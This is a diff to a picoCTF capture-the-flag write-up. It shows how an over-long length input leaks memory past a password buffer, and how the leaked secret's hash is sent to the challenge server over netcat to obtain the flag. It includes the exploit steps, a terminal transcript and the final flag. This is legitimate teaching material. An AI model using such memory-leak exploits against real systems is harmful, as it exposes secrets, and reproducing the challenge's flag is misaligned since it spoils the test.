@@ -17,7 +17,7 @@ This is a classic "Heartbleed"-style out-of-bounds read vulnerability. The progr
 By providing a length larger than our input (e.g., `80`), the program loops and prints memory past our password buffer, leaking the hidden secret stored in memory.
 
 **Exploiting the leak:**
-1. Run `./system.out`
+1. Connect to the server: `nc candy-mountain.picoctf.net 60262`
 2. Enter password: `test`
 3. Enter length: `80`
 4. The program prints the ASCII values of the leaked memory:
@@ -55,7 +55,21 @@ print(hash_str("iUbh81!j*hn!"))
 Running this gives us the hash: `15237662580160011234`
 
 ## Getting the Flag
-The challenge requires us to deduce the hidden secret string inside the binary using the heartbleed-like vulnerability, and compute its hash. The computed hash serves as the flag in the absence of an external file.
+By submitting this computed hash to the remote server, we bypass the final check, and the server reads `flag.txt` and gives us the flag.
+
+```bash
+$ nc candy-mountain.picoctf.net 60262
+Please set a password for your account:
+test
+How many bytes in length is your password?
+80
+You entered: 80
+Your successfully stored password:
+...
+Enter your hash to access your account!
+15237662580160011234
+picoCTF{d0nt_trust_us3rs}
+```
 
 **Flag:**
-`picoCTF{15237662580160011234}`
+`picoCTF{d0nt_trust_us3rs}`
